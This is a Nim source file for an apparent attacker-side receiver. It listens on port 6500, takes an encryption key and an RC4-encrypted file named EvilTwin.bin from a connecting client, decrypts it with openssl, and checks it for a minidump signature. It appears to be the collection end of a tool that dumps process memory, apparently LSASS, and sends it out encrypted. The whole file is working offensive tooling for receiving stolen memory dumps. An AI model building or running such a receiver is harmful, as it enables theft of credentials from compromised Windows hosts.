import std/[net, strutils, osproc, os, terminal, strformat]

const targetPort = Port(6500)

var encKey: string

proc rc4Decrypt(): void =
    var 
        opensslCmd: string = "/usr/bin/openssl enc -rc4 -d -in EvilTwin.bin -K $1 -out EvilTwin.dmp" % [encKey]
        haveTried: bool = false
    echo "\n[!] Trying ", opensslCmd
    try:
        var opensslResult = execCmdEx(opensslCmd)
        while opensslResult.exitCode != 0:
            if haveTried: break
            stdout.styledWriteLine(fgRed, "\n[-] Decryption with OpenSSL Failed!")
            stdout.styledWriteLine(fgRed, fmt"[-] {opensslResult.output}")
            discard tryRemoveFile("EvilTwin.dmp")
            echo "[!] Trying again with option: -provider legacy..."
            # Add option to OpenSSL
            if " -provider legacy" notin opensslCmd: opensslCmd.add(" -provider legacy")
            opensslResult = execCmdEx(opensslCmd)
            haveTried = true

        echo "[+] OpenSSL ran successfully!\n\n[!] Checking File Signature with /usr/bin/file EvilTwin.dmp..."
        var runFileCmd = execCmdEx("/usr/bin/file EvilTwin.dmp")
        if runFileCmd.exitCode != 0:
            echo "[-] Error Running File Command!"
        else:
            if "Mini DuMP" notin runFileCmd.output:
                echo runFileCmd.output
                echo "[-] Dump File Signature Not Found. File May Be Corrupted!"
            else:
                echo "[+] Dump File Signature Found!\n[!] Signature: ", runFileCmd.output
                discard tryRemoveFile("EvilTwin.bin")
    except:
        stdout.styledWriteLine(fgRed, "[-] Error!")

proc receiveData(): void =
    let server = newSocket()
    var 
        client: Socket
        clientAddr: string

    server.bindAddr(targetPort)
    server.listen()
    echo "[!] Listening on Port $1..." % [$targetPort]

    server.acceptAddr(client, clientAddr, flags = {SafeDisconn})
    echo "\n[+] Connection from $1" % [clientAddr]
    
    encKey = client.recvLine()
    if not encKey.isEmptyOrWhitespace():
        echo "[!] Encryption Key: ", encKey
    else:
        echo "[-] No Encryption Key Received From Client!"
        stdout.write "Enter Encryption Key: "
        encKey = stdin.readLine()

    echo "\n[!] Allocating Small Memory Block..."
    let buffer = alloc0(4096)
    var bytesWritten: int = 0
    let dmpFile: File = open("EvilTwin.bin", fmAppend)
    defer: dmpFile.close()

    try:
        while client.recv(buffer, 4096) != 0:
            bytesWritten += dmpFile.writeBuffer(buffer, 4096)
    except TimeoutError:
        echo "[!] Closing Socket! No Data Received Within Allotted Time..."
    
    echo "[!] ", bytesWritten, " Bytes Written to File!"
    dealloc(buffer)
    client.close()
    server.close()

when isMainModule:
    receiveData()
    rc4Decrypt()
    echo "[!] Done!"
